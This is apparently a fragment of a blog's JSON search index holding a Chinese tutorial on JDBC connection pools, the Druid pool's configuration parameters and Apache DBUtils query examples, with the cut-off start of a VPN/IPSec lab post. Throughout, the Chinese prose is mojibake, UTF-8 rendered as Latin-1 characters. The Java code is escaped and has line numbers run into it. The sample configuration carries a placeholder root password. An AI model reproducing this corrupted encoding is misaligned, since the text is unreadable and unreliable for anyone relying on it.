è¯·æ±‚çš„è¿æ¥æ•°è¶…è¿‡æœ€å¤§è¿æ¥æ•°é‡æ—¶ï¼Œè¿™äº›è¯·æ±‚å°†è¢«åŠ å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚\nå·¥ä½œåŸç†ï¼š æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯çš„ä¼˜ç‚¹\n1. èµ„æºé‡ç”¨\nç”±äºæ•°æ®åº“è¿æ¥å¾—ä»¥é‡ç”¨ï¼Œé¿å…äº†é¢‘ç¹åˆ›å»ºï¼Œé‡Šæ”¾è¿æ¥å¼•èµ·çš„å¤§é‡æ€§èƒ½å¼€é”€ã€‚åœ¨å‡å°‘ç³»ç»Ÿæ¶ˆè€—çš„åŸºç¡€ä¸Šï¼Œå¦ä¸€æ–¹é¢ä¹Ÿå¢åŠ äº†ç³»ç»Ÿè¿è¡Œç¯å¢ƒçš„å¹³ç¨³æ€§ã€‚\n2. æ›´å¿«çš„ç³»ç»Ÿååº”é€Ÿåº¦\næ•°æ®åº“è¿æ¥æ± åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€å·²ç»åˆ›å»ºäº†è‹¥å¹²æ•°æ®åº“è¿æ¥ç½®äºè¿æ¥æ± ä¸­å¤‡ç”¨ã€‚æ­¤æ—¶è¿æ¥çš„åˆå§‹åŒ–å·¥ä½œå‡å·²å®Œæˆã€‚å¯¹äºä¸šåŠ¡è¯·æ±‚å¤„ç†è€Œè¨€ï¼Œç›´æ¥åˆ©ç”¨ç°æœ‰å¯ç”¨è¿æ¥ï¼Œé¿å…äº†æ•°æ®åº“è¿æ¥åˆå§‹åŒ–å’Œé‡Šæ”¾è¿‡ç¨‹çš„æ—¶é—´å¼€é”€ï¼Œä»è€Œå‡å°‘äº†ç³»ç»Ÿçš„å“åº”æ—¶é—´\n3. æ–°çš„èµ„æºåˆ†é…æ‰‹æ®µ\nå¯¹äºå¤šåº”ç”¨å…±äº«åŒä¸€æ•°æ®åº“çš„ç³»ç»Ÿè€Œè¨€ï¼Œå¯åœ¨åº”ç”¨å±‚é€šè¿‡æ•°æ®åº“è¿æ¥æ± çš„é…ç½®ï¼Œå®ç°æŸä¸€åº”ç”¨æœ€å¤§å¯ç”¨æ•°æ®åº“è¿æ¥æ•°çš„é™åˆ¶ï¼Œé¿å…æŸä¸€åº”ç”¨ç‹¬å æ‰€æœ‰çš„æ•°æ®åº“èµ„æº\n4. ç»Ÿä¸€çš„è¿æ¥ç®¡ç†ï¼Œé¿å…æ•°æ®åº“è¿æ¥æ³„æ¼\nåœ¨è¾ƒä¸ºå®Œå–„çš„æ•°æ®åº“è¿æ¥æ± å®ç°ä¸­ï¼Œå¯æ ¹æ®é¢„å…ˆçš„å ç”¨è¶…æ—¶è®¾å®šï¼Œå¼ºåˆ¶å›æ”¶è¢«å ç”¨è¿æ¥ï¼Œä»è€Œé¿å…äº†å¸¸è§„æ•°æ®åº“è¿æ¥æ“ä½œä¸­å¯èƒ½å‡ºç°çš„èµ„æºæ³„éœ²\n8.2 å¤šç§å¼€æºçš„æ•°æ®åº“è¿æ¥æ±  JDBC çš„æ•°æ®åº“è¿æ¥æ± ä½¿ç”¨ javax.sql.DataSource æ¥è¡¨ç¤ºï¼ŒDataSource åªæ˜¯ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£é€šå¸¸ç”±æœåŠ¡å™¨(Weblogic, WebSphere, Tomcat)æä¾›å®ç°ï¼Œä¹Ÿæœ‰ä¸€äº›å¼€æºç»„ç»‡æä¾›å®ç°ï¼š DBCP æ˜¯Apacheæä¾›çš„æ•°æ®åº“è¿æ¥æ± ã€‚tomcat æœåŠ¡å™¨è‡ªå¸¦dbcpæ•°æ®åº“è¿æ¥æ± ã€‚é€Ÿåº¦ç›¸å¯¹c3p0è¾ƒå¿«ï¼Œä½†å› è‡ªèº«å­˜åœ¨BUGï¼ŒHibernate3å·²ä¸å†æä¾›æ”¯æŒã€‚ C3P0 æ˜¯ä¸€ä¸ªå¼€æºç»„ç»‡æä¾›çš„ä¸€ä¸ªæ•°æ®åº“è¿æ¥æ± ï¼Œ**é€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ï¼Œç¨³å®šæ€§è¿˜å¯ä»¥ã€‚**hibernateå®˜æ–¹æ¨èä½¿ç”¨ Proxool æ˜¯sourceforgeä¸‹çš„ä¸€ä¸ªå¼€æºé¡¹ç›®æ•°æ®åº“è¿æ¥æ± ï¼Œæœ‰ç›‘æ§è¿æ¥æ± çŠ¶æ€çš„åŠŸèƒ½ï¼Œç¨³å®šæ€§è¾ƒc3p0å·®ä¸€ç‚¹ BoneCP æ˜¯ä¸€ä¸ªå¼€æºç»„ç»‡æä¾›çš„æ•°æ®åº“è¿æ¥æ± ï¼Œé€Ÿåº¦å¿« Druid æ˜¯é˜¿é‡Œæä¾›çš„æ•°æ®åº“è¿æ¥æ± ï¼Œæ®è¯´æ˜¯é›†DBCP ã€C3P0 ã€Proxool ä¼˜ç‚¹äºä¸€èº«çš„æ•°æ®åº“è¿æ¥æ± ï¼Œä½†æ˜¯é€Ÿåº¦ä¸ç¡®å®šæ˜¯å¦æœ‰BoneCPå¿« DataSource é€šå¸¸è¢«ç§°ä¸ºæ•°æ®æºï¼Œå®ƒåŒ…å«è¿æ¥æ± å’Œè¿æ¥æ± ç®¡ç†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¹ æƒ¯ä¸Šä¹Ÿç»å¸¸æŠŠ DataSource ç§°ä¸ºè¿æ¥æ±  DataSourceç”¨æ¥å–ä»£DriverManageræ¥è·å–Connectionï¼Œè·å–é€Ÿåº¦å¿«ï¼ŒåŒæ—¶å¯ä»¥å¤§å¹…åº¦æé«˜æ•°æ®åº“è®¿é—®é€Ÿåº¦ã€‚ ç‰¹åˆ«æ³¨æ„ï¼š æ•°æ®æºå’Œæ•°æ®åº“è¿æ¥ä¸åŒï¼Œæ•°æ®æºæ— éœ€åˆ›å»ºå¤šä¸ªï¼Œå®ƒæ˜¯äº§ç”Ÿæ•°æ®åº“è¿æ¥çš„å·¥å‚ï¼Œå› æ­¤æ•´ä¸ªåº”ç”¨åªéœ€è¦ä¸€ä¸ªæ•°æ®æºå³å¯ã€‚ å½“æ•°æ®åº“è®¿é—®ç»“æŸåï¼Œç¨‹åºè¿˜æ˜¯åƒä»¥å‰ä¸€æ ·å…³é—­æ•°æ®åº“è¿æ¥ï¼šconn.close(); ä½†conn.close()å¹¶æ²¡æœ‰å…³é—­æ•°æ®åº“çš„ç‰©ç†è¿æ¥ï¼Œå®ƒä»…ä»…æŠŠæ•°æ®åº“è¿æ¥é‡Šæ”¾ï¼Œå½’è¿˜ç»™äº†æ•°æ®åº“è¿æ¥æ± ã€‚ 8.2.1 Druidï¼ˆå¾·é²ä¼Šï¼‰æ•°æ®åº“è¿æ¥æ±  Druidæ˜¯é˜¿é‡Œå·´å·´å¼€æºå¹³å°ä¸Šä¸€ä¸ªæ•°æ®åº“è¿æ¥æ± å®ç°ï¼Œå®ƒç»“åˆäº†C3P0ã€DBCPã€Proxoolç­‰DBæ± çš„ä¼˜ç‚¹ï¼ŒåŒæ—¶åŠ å…¥äº†æ—¥å¿—ç›‘æ§ï¼Œå¯ä»¥å¾ˆå¥½çš„ç›‘æ§DBæ± è¿æ¥å’ŒSQLçš„æ‰§è¡Œæƒ…å†µï¼Œå¯ä»¥è¯´æ˜¯é’ˆå¯¹ç›‘æ§è€Œç”Ÿçš„DBè¿æ¥æ± ï¼Œå¯ä»¥è¯´æ˜¯ç›®å‰æœ€å¥½çš„è¿æ¥æ± ä¹‹ä¸€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.atguigu.druid; import java.sql.Connection; import java.util.Properties; import javax.sql.DataSource; import com.alibaba.druid.pool.DruidDataSourceFactory; public class TestDruid { public static void main(String[] args) throws Exception { Properties pro = new Properties();\tpro.load(TestDruid.class.getClassLoader().getResourceAsStream(\u0026#34;druid.properties\u0026#34;)); DataSource ds = DruidDataSourceFactory.createDataSource(pro); Connection conn = ds.getConnection(); System.out.println(conn); } } å…¶ä¸­ï¼Œsrcä¸‹çš„é…ç½®æ–‡ä»¶ä¸ºï¼šã€druid.propertiesã€‘\n1 2 3 4 5 6 7 8 9 url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true username=root password=123456 driverClassName=com.mysql.jdbc.Driver initialSize=10 maxActive=20 maxWait=1000 filters=wall è¯¦ç»†é…ç½®å‚æ•°ï¼š é…ç½® ç¼ºçœ è¯´æ˜ name é…ç½®è¿™ä¸ªå±æ€§çš„æ„ä¹‰åœ¨äºï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªæ•°æ®æºï¼Œç›‘æ§çš„æ—¶å€™å¯ä»¥é€šè¿‡åå­—æ¥åŒºåˆ†å¼€æ¥ã€‚ å¦‚æœæ²¡æœ‰é…ç½®ï¼Œå°†ä¼šç”Ÿæˆä¸€ä¸ªåå­—ï¼Œæ ¼å¼æ˜¯ï¼šâ€DataSource-â€ + System.identityHashCode(this) url è¿æ¥æ•°æ®åº“çš„urlï¼Œä¸åŒæ•°æ®åº“ä¸ä¸€æ ·ã€‚ä¾‹å¦‚ï¼šmysql : jdbc:mysql://10.20.153.104:3306/druid2 oracle : jdbc:oracle:thin:@10.20.149.85:1521:ocnauto username è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å password è¿æ¥æ•°æ®åº“çš„å¯†ç ã€‚å¦‚æœä½ ä¸å¸Œæœ›å¯†ç ç›´æ¥å†™åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ConfigFilterã€‚è¯¦ç»†çœ‹è¿™é‡Œï¼šhttps://github.com/alibaba/druid/wiki/%E4%BD%BF%E7%94%A8ConfigFilter driverClassName æ ¹æ®urlè‡ªåŠ¨è¯†åˆ« è¿™ä¸€é¡¹å¯é…å¯ä¸é…ï¼Œå¦‚æœä¸é…ç½®druidä¼šæ ¹æ®urlè‡ªåŠ¨è¯†åˆ«dbTypeï¼Œç„¶åé€‰æ‹©ç›¸åº”çš„driverClassName(å»ºè®®é…ç½®ä¸‹) initialSize 0 åˆå§‹åŒ–æ—¶å»ºç«‹ç‰©ç†è¿æ¥çš„ä¸ªæ•°ã€‚åˆå§‹åŒ–å‘ç”Ÿåœ¨æ˜¾ç¤ºè°ƒç”¨initæ–¹æ³•ï¼Œæˆ–è€…ç¬¬ä¸€æ¬¡getConnectionæ—¶ maxActive 8 æœ€å¤§è¿æ¥æ± æ•°é‡ maxIdle 8 å·²ç»ä¸å†ä½¿ç”¨ï¼Œé…ç½®äº†ä¹Ÿæ²¡æ•ˆæœ minIdle æœ€å°è¿æ¥æ± æ•°é‡ maxWait è·å–è¿æ¥æ—¶æœ€å¤§ç­‰å¾…æ—¶é—´ï¼Œå•ä½æ¯«ç§’ã€‚é…ç½®äº†maxWaitä¹‹åï¼Œç¼ºçœå¯ç”¨å…¬å¹³é”ï¼Œå¹¶å‘æ•ˆç‡ä¼šæœ‰æ‰€ä¸‹é™ï¼Œå¦‚æœéœ€è¦å¯ä»¥é€šè¿‡é…ç½®useUnfairLockå±æ€§ä¸ºtrueä½¿ç”¨éå…¬å¹³é”ã€‚ poolPreparedStatements false æ˜¯å¦ç¼“å­˜preparedStatementï¼Œä¹Ÿå°±æ˜¯PSCacheã€‚PSCacheå¯¹æ”¯æŒæ¸¸æ ‡çš„æ•°æ®åº“æ€§èƒ½æå‡å·¨å¤§ï¼Œæ¯”å¦‚è¯´oracleã€‚åœ¨mysqlä¸‹å»ºè®®å…³é—­ã€‚ maxOpenPreparedStatements -1 è¦å¯ç”¨PSCacheï¼Œå¿…é¡»é…ç½®å¤§äº0ï¼Œå½“å¤§äº0æ—¶ï¼ŒpoolPreparedStatementsè‡ªåŠ¨è§¦å‘ä¿®æ”¹ä¸ºtrueã€‚åœ¨Druidä¸­ï¼Œä¸ä¼šå­˜åœ¨Oracleä¸‹PSCacheå ç”¨å†…å­˜è¿‡å¤šçš„é—®é¢˜ï¼Œå¯ä»¥æŠŠè¿™ä¸ªæ•°å€¼é…ç½®å¤§ä¸€äº›ï¼Œæ¯”å¦‚è¯´100 validationQuery ç”¨æ¥æ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆçš„sqlï¼Œè¦æ±‚æ˜¯ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚å¦‚æœvalidationQueryä¸ºnullï¼ŒtestOnBorrowã€testOnReturnã€testWhileIdleéƒ½ä¸ä¼šå…¶ä½œç”¨ã€‚ testOnBorrow true ç”³è¯·è¿æ¥æ—¶æ‰§è¡ŒvalidationQueryæ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆï¼Œåšäº†è¿™ä¸ªé…ç½®ä¼šé™ä½æ€§èƒ½ã€‚ testOnReturn false å½’è¿˜è¿æ¥æ—¶æ‰§è¡ŒvalidationQueryæ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆï¼Œåšäº†è¿™ä¸ªé…ç½®ä¼šé™ä½æ€§èƒ½ testWhileIdle false å»ºè®®é…ç½®ä¸ºtrueï¼Œä¸å½±å“æ€§èƒ½ï¼Œå¹¶ä¸”ä¿è¯å®‰å…¨æ€§ã€‚ç”³è¯·è¿æ¥çš„æ—¶å€™æ£€æµ‹ï¼Œå¦‚æœç©ºé—²æ—¶é—´å¤§äºtimeBetweenEvictionRunsMillisï¼Œæ‰§è¡ŒvalidationQueryæ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆã€‚ timeBetweenEvictionRunsMillis æœ‰ä¸¤ä¸ªå«ä¹‰ï¼š 1)Destroyçº¿ç¨‹ä¼šæ£€æµ‹è¿æ¥çš„é—´éš”æ—¶é—´2)testWhileIdleçš„åˆ¤æ–­ä¾æ®ï¼Œè¯¦ç»†çœ‹testWhileIdleå±æ€§çš„è¯´æ˜ numTestsPerEvictionRun ä¸å†ä½¿ç”¨ï¼Œä¸€ä¸ªDruidDataSourceåªæ”¯æŒä¸€ä¸ªEvictionRun minEvictableIdleTimeMillis connectionInitSqls ç‰©ç†è¿æ¥åˆå§‹åŒ–çš„æ—¶å€™æ‰§è¡Œçš„sql exceptionSorter æ ¹æ®dbTypeè‡ªåŠ¨è¯†åˆ« å½“æ•°æ®åº“æŠ›å‡ºä¸€äº›ä¸å¯æ¢å¤çš„å¼‚å¸¸æ—¶ï¼ŒæŠ›å¼ƒè¿æ¥ filters å±æ€§ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œé€šè¿‡åˆ«åçš„æ–¹å¼é…ç½®æ‰©å±•æ’ä»¶ï¼Œå¸¸ç”¨çš„æ’ä»¶æœ‰ï¼š ç›‘æ§ç»Ÿè®¡ç”¨çš„filter:statæ—¥å¿—ç”¨çš„filter:log4jé˜²å¾¡sqlæ³¨å…¥çš„filter:wall proxyFilters ç±»å‹æ˜¯Listï¼Œå¦‚æœåŒæ—¶é…ç½®äº†filterså’ŒproxyFiltersï¼Œæ˜¯ç»„åˆå…³ç³»ï¼Œå¹¶éæ›¿æ¢å…³ç³» ä¹ï¼šApache-DBUtilså®ç°CRUDæ“ä½œ 9.1 Apache-DBUtilsç®€ä»‹ commons-dbutils æ˜¯ Apache ç»„ç»‡æä¾›çš„ä¸€ä¸ªå¼€æº JDBCå·¥å…·ç±»åº“ï¼Œå®ƒæ˜¯å¯¹JDBCçš„ç®€å•å°è£…ï¼Œå­¦ä¹ æˆæœ¬æä½ï¼Œå¹¶ä¸”ä½¿ç”¨dbutilsèƒ½æå¤§ç®€åŒ–jdbcç¼–ç çš„å·¥ä½œé‡ï¼ŒåŒæ—¶ä¹Ÿä¸ä¼šå½±å“ç¨‹åºçš„æ€§èƒ½ã€‚ APIä»‹ç»ï¼š org.apache.commons.dbutils.QueryRunner org.apache.commons.dbutils.ResultSetHandler å·¥å…·ç±»ï¼šorg.apache.commons.dbutils.DbUtils æœ‰äº†DBUtilså¯ä»¥ç›´æ¥è°ƒç”¨APIä½¿ç”¨å¢åˆ æ”¹æŸ¥æ“ä½œäº†ã€‚ 9.2 ä¸»è¦APIçš„ä½¿ç”¨ 9.2.1 DbUtils DbUtils ï¼šæä¾›å¦‚å…³é—­è¿æ¥ã€è£…è½½JDBCé©±åŠ¨ç¨‹åºç­‰å¸¸è§„å·¥ä½œçš„å·¥å…·ç±»ï¼Œé‡Œé¢çš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯é™æ€çš„ã€‚ä¸»è¦æ–¹æ³•å¦‚ä¸‹ï¼š public static void close(â€¦) throws java.sql.SQLExceptionï¼šã€€DbUtilsç±»æä¾›äº†ä¸‰ä¸ªé‡è½½çš„å…³é—­æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•æ£€æŸ¥æ‰€æä¾›çš„å‚æ•°æ˜¯ä¸æ˜¯NULLï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œå®ƒä»¬å°±å…³é—­Connectionã€Statementå’ŒResultSetã€‚ public static void closeQuietly(â€¦): è¿™ä¸€ç±»æ–¹æ³•ä¸ä»…èƒ½åœ¨Connectionã€Statementå’ŒResultSetä¸ºNULLæƒ…å†µä¸‹é¿å…å…³é—­ï¼Œè¿˜èƒ½éšè—ä¸€äº›åœ¨ç¨‹åºä¸­æŠ›å‡ºçš„SQLEeceptionã€‚ public static void commitAndClose(Connection conn)throws SQLExceptionï¼š ç”¨æ¥æäº¤è¿æ¥çš„äº‹åŠ¡ï¼Œç„¶åå…³é—­è¿æ¥ public static void commitAndCloseQuietly(Connection conn)ï¼š ç”¨æ¥æäº¤è¿æ¥ï¼Œç„¶åå…³é—­è¿æ¥ï¼Œå¹¶ä¸”åœ¨å…³é—­è¿æ¥æ—¶ä¸æŠ›å‡ºSQLå¼‚å¸¸ã€‚ public static void rollback(Connection conn)throws SQLExceptionï¼šå…è®¸connä¸ºnullï¼Œå› ä¸ºæ–¹æ³•å†…éƒ¨åšäº†åˆ¤æ–­ public static void rollbackAndClose(Connection conn)throws SQLException rollbackAndCloseQuietly(Connection) public static boolean loadDriver(java.lang.String driverClassName)ï¼šè¿™ä¸€æ–¹è£…è½½å¹¶æ³¨å†ŒJDBCé©±åŠ¨ç¨‹åºï¼Œå¦‚æœæˆåŠŸå°±è¿”å›trueã€‚ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä½ ä¸éœ€è¦æ•æ‰è¿™ä¸ªå¼‚å¸¸ClassNotFoundExceptionã€‚ 9.2.2 QueryRunnerç±» è¯¥ç±»ç®€å•åŒ–äº†SQLæŸ¥è¯¢ï¼Œå®ƒä¸ResultSetHandlerç»„åˆåœ¨ä¸€èµ·ä½¿ç”¨å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„æ•°æ®åº“æ“ä½œï¼Œèƒ½å¤Ÿå¤§å¤§å‡å°‘ç¼–ç é‡ã€‚ QueryRunnerç±»æä¾›äº†ä¸¤ä¸ªæ„é€ å™¨ï¼š é»˜è®¤çš„æ„é€ å™¨ éœ€è¦ä¸€ä¸ª javax.sql.DataSource æ¥ä½œå‚æ•°çš„æ„é€ å™¨ QueryRunnerç±»çš„ä¸»è¦æ–¹æ³•ï¼š æ›´æ–° public int update(Connection conn, String sql, Object... params) throws SQLException:ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ›´æ–°ï¼ˆæ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤ï¼‰æ“ä½œã€‚ \u0026hellip;\u0026hellip; æ’å…¥ public \u0026lt;T\u0026gt; T insert(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh, Object... params) throws SQLExceptionï¼šåªæ”¯æŒINSERTè¯­å¥ï¼Œå…¶ä¸­ rsh - The handler used to create the result object from the ResultSet of auto-generated keys. è¿”å›å€¼: An object generated by the handler.å³è‡ªåŠ¨ç”Ÿæˆçš„é”®å€¼ \u0026hellip;. æ‰¹å¤„ç† public int[] batch(Connection conn,String sql,Object[][] params)throws SQLExceptionï¼š INSERT, UPDATE, or DELETEè¯­å¥ public \u0026lt;T\u0026gt; T insertBatch(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh,Object[][] params)throws SQLExceptionï¼šåªæ”¯æŒINSERTè¯­å¥ æŸ¥è¯¢ public Object query(Connection conn, String sql, ResultSetHandler rsh,Object... params) throws SQLExceptionï¼šæ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢æ“ä½œï¼Œåœ¨è¿™ä¸ªæŸ¥è¯¢ä¸­ï¼Œå¯¹è±¡æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ å€¼è¢«ç”¨æ¥ä½œä¸ºæŸ¥è¯¢è¯­å¥çš„ç½®æ¢å‚æ•°ã€‚è¯¥æ–¹æ³•ä¼šè‡ªè¡Œå¤„ç† PreparedStatement å’Œ ResultSet çš„åˆ›å»ºå’Œå…³é—­ã€‚ æµ‹è¯• 1 2 3 4 5 6 7 8 9 10 11 12 13 // æµ‹è¯•æ·»åŠ  @Test public void testInsert() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;insert into customers(name,email,birth)values(?,?,?)\u0026#34;; int count = runner.update(conn, sql, \u0026#34;ä½•æˆé£\u0026#34;, \u0026#34;he@qq.com\u0026#34;, \u0026#34;1992-09-08\u0026#34;); System.out.println(\u0026#34;æ·»åŠ äº†\u0026#34; + count + \u0026#34;æ¡è®°å½•\u0026#34;); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 // æµ‹è¯•åˆ é™¤ @Test public void testDelete() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;delete from customers where id \u0026lt; ?\u0026#34;; int count = runner.update(conn, sql,3); System.out.println(\u0026#34;åˆ é™¤äº†\u0026#34; + count + \u0026#34;æ¡è®°å½•\u0026#34;); JDBCUtils.closeResource(conn, null); } 9.2.3 ResultSetHandleræ¥å£åŠå®ç°ç±» è¯¥æ¥å£ç”¨äºå¤„ç† java.sql.ResultSetï¼Œå°†æ•°æ®æŒ‰è¦æ±‚è½¬æ¢ä¸ºå¦ä¸€ç§å½¢å¼ã€‚\nResultSetHandler æ¥å£æä¾›äº†ä¸€ä¸ªå•ç‹¬çš„æ–¹æ³•ï¼šObject handle (java.sql.ResultSet .rs)ã€‚\næ¥å£çš„ä¸»è¦å®ç°ç±»ï¼š\nArrayHandlerï¼šæŠŠç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®è½¬æˆå¯¹è±¡æ•°ç»„ã€‚ ArrayListHandlerï¼šæŠŠç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½è½¬æˆä¸€ä¸ªæ•°ç»„ï¼Œå†å­˜æ”¾åˆ°Listä¸­ã€‚ **BeanHandlerï¼š**å°†ç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®å°è£…åˆ°ä¸€ä¸ªå¯¹åº”çš„JavaBeanå®ä¾‹ä¸­ã€‚ **BeanListHandlerï¼š**å°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªå¯¹åº”çš„JavaBeanå®ä¾‹ä¸­ï¼Œå­˜æ”¾åˆ°Listé‡Œã€‚ ColumnListHandlerï¼šå°†ç»“æœé›†ä¸­æŸä¸€åˆ—çš„æ•°æ®å­˜æ”¾åˆ°Listä¸­ã€‚ KeyedHandler(name)ï¼šå°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œå†æŠŠè¿™äº›mapå†å­˜åˆ°ä¸€ä¸ªmapé‡Œï¼Œå…¶keyä¸ºæŒ‡å®šçš„keyã€‚ **MapHandlerï¼š**å°†ç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œkeyæ˜¯åˆ—åï¼Œvalueå°±æ˜¯å¯¹åº”çš„å€¼ã€‚ **MapListHandlerï¼š**å°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œç„¶åå†å­˜æ”¾åˆ°List **ScalarHandlerï¼š**æŸ¥è¯¢å•ä¸ªå€¼å¯¹è±¡ æµ‹è¯•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* * æµ‹è¯•æŸ¥è¯¢:æŸ¥è¯¢ä¸€æ¡è®°å½• * * ä½¿ç”¨ResultSetHandlerçš„å®ç°ç±»ï¼šBeanHandler */ @Test public void testQueryInstance() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; // BeanHandler\u0026lt;Customer\u0026gt; handler = new BeanHandler\u0026lt;\u0026gt;(Customer.class); Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer);\tJDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* * æµ‹è¯•æŸ¥è¯¢:æŸ¥è¯¢å¤šæ¡è®°å½•æ„æˆçš„é›†åˆ * * ä½¿ç”¨ResultSetHandlerçš„å®ç°ç±»ï¼šBeanListHandler */ @Test public void testQueryList() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id \u0026lt; ?\u0026#34;; // BeanListHandler\u0026lt;Customer\u0026gt; handler = new BeanListHandler\u0026lt;\u0026gt;(Customer.class); List\u0026lt;Customer\u0026gt; list = runner.query(conn, sql, handler, 23); list.forEach(System.out::println); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /* * è‡ªå®šä¹‰ResultSetHandlerçš„å®ç°ç±» */ @Test public void testQueryInstance1() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; ResultSetHandler\u0026lt;Customer\u0026gt; handler = new ResultSetHandler\u0026lt;Customer\u0026gt;() { @Override public Customer handle(ResultSet rs) throws SQLException { System.out.println(\u0026#34;handle\u0026#34;); //\treturn new Customer(1,\u0026#34;Tom\u0026#34;,\u0026#34;tom@126.com\u0026#34;,new Date(123323432L)); if(rs.next()){ int id = rs.getInt(\u0026#34;id\u0026#34;); String name = rs.getString(\u0026#34;name\u0026#34;); String email = rs.getString(\u0026#34;email\u0026#34;); Date birth = rs.getDate(\u0026#34;birth\u0026#34;); return new Customer(id, name, email, birth); } return null; } }; Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * å¦‚ä½•æŸ¥è¯¢ç±»ä¼¼äºæœ€å¤§çš„ï¼Œæœ€å°çš„ï¼Œå¹³å‡çš„ï¼Œæ€»å’Œï¼Œä¸ªæ•°ç›¸å…³çš„æ•°æ®ï¼Œ * ä½¿ç”¨ScalarHandler * */ @Test public void testQueryValue() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); //æµ‹è¯•ä¸€ï¼š //\tString sql = \u0026#34;select count(*) from customers where id \u0026lt; ?\u0026#34;; //\tScalarHandler handler = new ScalarHandler(); //\tlong count = (long) runner.query(conn, sql, handler, 20); //\tSystem.out.println(count); //æµ‹è¯•äºŒï¼š String sql = \u0026#34;select max(birth) from customers\u0026#34;; ScalarHandler handler = new ScalarHandler(); Date birth = (Date) runner.query(conn, sql, handler); System.out.println(birth); JDBCUtils.closeResource(conn, null); } ","permalink":"http://www.reus09.top/posts/tech/jdbc/","summary":"ä¸€ï¼šJDBCæ¦‚è¿° 1.1 æ•°æ®çš„æŒä¹…åŒ– æŒä¹…åŒ–(persistence)ï¼šæŠŠæ•°æ®ä¿å­˜åˆ°å¯æ‰ç”µå¼å­˜å‚¨è®¾å¤‡ä¸­ä»¥ä¾›ä¹‹åä½¿ç”¨ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯ä¼ä¸šçº§åº”ç”¨ï¼Œ","title":"Jdbc"},{"content":"VPNé…ç½®å®éªŒ 0x01 å®éªŒå†…å®¹ åœ¨Windows IPSECé…ç½®å®éªŒä¸­ï¼Œé€šè¿‡æŠ“åŒ…å·¥å…·æŠ“å–IKE SAå’ŒIPSEC SAå»ºç«‹è¿‡ç¨‹çš„æ•°æ®åŒ…ï¼Œå¹¶è¿›è¡Œåˆ†æï¼›æ€è€ƒï¼šIKEå¯†é’¥åå•†è¿‡ç¨‹æ˜¯å¦å­˜åœ¨å®‰å…¨å¨èƒã€‚ é‡‡ç”¨IPSecéš§é“æ¨¡å¼åœ¨ä¸¤å°ç”¨ä½œç½‘å…³çš„è®¡ç®—æœºä¹‹é—´é…ç½®VPNï¼ŒæŠ“å–ä¸¤å°è®¡ç®—æœºä¹‹é—´çš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ•°æ®çš„æœºå¯†æ€§ï¼Œæäº¤å®éªŒæ­¥éª¤å’Œåˆ†æç»“æœã€‚(æç¤ºï¼šå¯ä»¥ä½¿ç”¨ping\\net send 